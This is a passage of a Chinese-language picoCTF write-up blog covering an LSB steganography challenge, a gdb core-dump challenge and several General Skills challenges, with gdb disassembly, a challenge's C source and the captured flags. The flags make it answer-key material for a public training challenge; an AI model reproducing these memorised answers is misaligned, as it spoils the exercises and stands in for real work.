</span></span><span style=display:flex><span>                break
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># python lsb.py | strings | grep -o picoCTF{.*}</span>
</span></span><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>st0r3d_iN_tH3_l345t_s1gn1f1c4nT_b1t5_2903593693<span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=core>core<a hidden class=anchor aria-hidden=true href=#core>#</a></h2><p>core file或者core dunp是一个保存进程运行时内存镜像和进程状态（如寄存器的值等）的文件。没挂调试器的程序崩溃时一般会自动产生core文件用于post-mortem debugging。可以使用 <code>gdb program [core dump]</code> 开始调试。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-37>37</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>(gdb) disas main
</span></span><span style=display:flex><span>Dump of assembler code for function main:
</span></span><span style=display:flex><span>   0x080487ec &lt;+0&gt;:     lea    ecx,[esp+0x4]
</span></span><span style=display:flex><span>   0x080487f0 &lt;+4&gt;:     and    esp,0xfffffff0
</span></span><span style=display:flex><span>   0x080487f3 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]
</span></span><span style=display:flex><span>   0x080487f6 &lt;+10&gt;:    push   ebp
</span></span><span style=display:flex><span>   0x080487f7 &lt;+11&gt;:    mov    ebp,esp
</span></span><span style=display:flex><span>   0x080487f9 &lt;+13&gt;:    push   ecx
</span></span><span style=display:flex><span>   0x080487fa &lt;+14&gt;:    sub    esp,0x4
</span></span><span style=display:flex><span>   0x080487fd &lt;+17&gt;:    call   0x80485bb &lt;load_strings&gt;
</span></span><span style=display:flex><span>   0x08048802 &lt;+22&gt;:    call   0x80487c1 &lt;print_flag&gt;
</span></span><span style=display:flex><span>   0x08048807 &lt;+27&gt;:    mov    eax,0x0
</span></span><span style=display:flex><span>   0x0804880c &lt;+32&gt;:    add    esp,0x4
</span></span><span style=display:flex><span>   0x0804880f &lt;+35&gt;:    pop    ecx
</span></span><span style=display:flex><span>   0x08048810 &lt;+36&gt;:    pop    ebp
</span></span><span style=display:flex><span>   0x08048811 &lt;+37&gt;:    lea    esp,[ecx-0x4]
</span></span><span style=display:flex><span>   0x08048814 &lt;+40&gt;:    ret
</span></span><span style=display:flex><span>End of assembler dump.
</span></span><span style=display:flex><span>(gdb) disas print_flag
</span></span><span style=display:flex><span>Dump of assembler code for function print_flag:
</span></span><span style=display:flex><span>=&gt; 0x080487c1 &lt;+0&gt;:     push   ebp
</span></span><span style=display:flex><span>   0x080487c2 &lt;+1&gt;:     mov    ebp,esp
</span></span><span style=display:flex><span>   0x080487c4 &lt;+3&gt;:     sub    esp,0x18
</span></span><span style=display:flex><span>   0x080487c7 &lt;+6&gt;:     mov    DWORD PTR [ebp-0xc],0x539
</span></span><span style=display:flex><span>   0x080487ce &lt;+13&gt;:    mov    eax,DWORD PTR [ebp-0xc]
</span></span><span style=display:flex><span>   0x080487d1 &lt;+16&gt;:    mov    eax,DWORD PTR [eax*4+0x804a080]
</span></span><span style=display:flex><span>   0x080487d8 &lt;+23&gt;:    sub    esp,0x8
</span></span><span style=display:flex><span>   0x080487db &lt;+26&gt;:    push   eax ;flag字符串的地址保存在eax中
</span></span><span style=display:flex><span>   0x080487dc &lt;+27&gt;:    push   0x804894c
</span></span><span style=display:flex><span>   0x080487e1 &lt;+32&gt;:    call   0x8048410 &lt;printf@plt&gt;
</span></span><span style=display:flex><span>   0x080487e6 &lt;+37&gt;:    add    esp,0x10
</span></span><span style=display:flex><span>   0x080487e9 &lt;+40&gt;:    nop
</span></span><span style=display:flex><span>   0x080487ea &lt;+41&gt;:    leave
</span></span><span style=display:flex><span>   0x080487eb &lt;+42&gt;:    ret
</span></span><span style=display:flex><span>End of assembler dump.
</span></span><span style=display:flex><span>(gdb) x/sb *(0x804a080+4*0x539)
</span></span><span style=display:flex><span>0x80610f0:      &#34;c96bd0fa2da5c0853cf12c4f93fce288&#34;s
</span></span></code></pre></td></tr></table></div></div><p><code>picoCTF{c96bd0fa2da5c0853cf12c4f93fce288}</code>每个人的答案是不同的。</p><h1 id=general-skills>General Skills<a hidden class=anchor aria-hidden=true href=#general-skills>#</a></h1><h2 id=absolutely-relative>absolutely relative<a hidden class=anchor aria-hidden=true href=#absolutely-relative>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-37>37</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define yes_len 3
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>yes <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;yes&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> flag[<span style=color:#ae81ff>99</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> permission[<span style=color:#ae81ff>10</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> i;
</span></span><span style=display:flex><span>    FILE <span style=color:#f92672>*</span> file;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    file <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;/problems/absolutely-relative_2_69862edfe341b57b6ed2c62c7107daee/flag.txt&#34;</span> , <span style=color:#e6db74>&#34;r&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (file) {
</span></span><span style=display:flex><span>    	<span style=color:#66d9ef>while</span> (<span style=color:#a6e22e>fscanf</span>(file, <span style=color:#e6db74>&#34;%s&#34;</span>, flag)<span style=color:#f92672>!=</span>EOF)
</span></span><span style=display:flex><span>    	<span style=color:#a6e22e>fclose</span>(file);
</span></span><span style=display:flex><span>    }   
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>    file <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>( <span style=color:#e6db74>&#34;./permission.txt&#34;</span> , <span style=color:#e6db74>&#34;r&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (file) {
</span></span><span style=display:flex><span>    	<span style=color:#66d9ef>for</span> (i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>5</span>; i<span style=color:#f92672>++</span>){
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>fscanf</span>(file, <span style=color:#e6db74>&#34;%s&#34;</span>, permission);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        permission[<span style=color:#ae81ff>5</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>fclose</span>(file);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>strncmp</span>(permission, yes, yes_len)) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;You have the write permissions.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, flag);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;You do not have sufficient permissions to view the flag.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=d31e834f8a5a76ef2.png alt></p><p><code>picoCTF{3v3r1ng_1$_r3l3t1v3_372b3859}</code></p><h2 id=aca-shell-a>Aca-Shell-A<a hidden class=anchor aria-hidden=true href=#aca-shell-a>#</a></h2><p><img loading=lazy src=1712e5d2c6d79fd0f.png alt></p><p><img loading=lazy src=20eaeefcda961c811.png alt></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>CrUsHeD_It_17ab99f5<span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=in-out-error>in out error<a hidden class=anchor aria-hidden=true href=#in-out-error>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;Please may I have the flag?&#34;</span> | ./in-out-error  &gt; ~/result.txt
</span></span><span style=display:flex><span><span style=color:#75715e>#picoCTF{p1p1ng_1S_4_7h1ng_f37fb67e}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=learn-gdb>learn gdb<a hidden class=anchor aria-hidden=true href=#learn-gdb>#</a></h2><p><code>picoCTF{gDb_iS_sUp3r_u53fuL_f3f39814}</code></p><p><img loading=lazy src=d866767f57d23f008.png alt></p><h2 id=store>store<a hidden class=anchor aria-hidden=true href=#store>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-10>10</a>
